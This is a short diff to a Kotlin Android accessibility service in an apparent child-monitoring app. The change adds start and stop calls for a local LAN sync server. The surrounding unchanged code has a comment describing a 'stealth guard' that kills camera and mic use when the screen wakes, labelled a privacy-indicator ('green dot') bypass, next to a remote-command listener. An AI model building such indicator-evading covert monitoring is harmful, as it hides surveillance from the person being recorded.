@@ -670,7 +670,10 @@ class VyraAccessibilityService : AccessibilityService() {
         val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
         firebaseSync.syncDeviceStatus(isOnline = true)
 
-        // 2. STEALTH GUARD: Auto-Kill Camera & Mic on Screen Wake (Green Dot Bypass)
+        // 2. Start Same-Wi-Fi Direct LAN Sync Server (Zero cloud quota)
+        com.vyra.kids.core.LocalLanSyncServer.getInstance(this).start()
+
+        // 3. STEALTH GUARD: Auto-Kill Camera & Mic on Screen Wake (Green Dot Bypass)
         registerStealthScreenGuard()
 
         firebaseSync.startListeningToCommands { action, payload ->
@@ -868,6 +871,9 @@ class VyraAccessibilityService : AccessibilityService() {
     }
 
     override fun onDestroy() {
+        try {
+            com.vyra.kids.core.LocalLanSyncServer.getInstance(this).stop()
+        } catch (_: Exception) {}
         screenStateReceiver?.let {
             try { unregisterReceiver(it) } catch (_: Exception) {}
         }
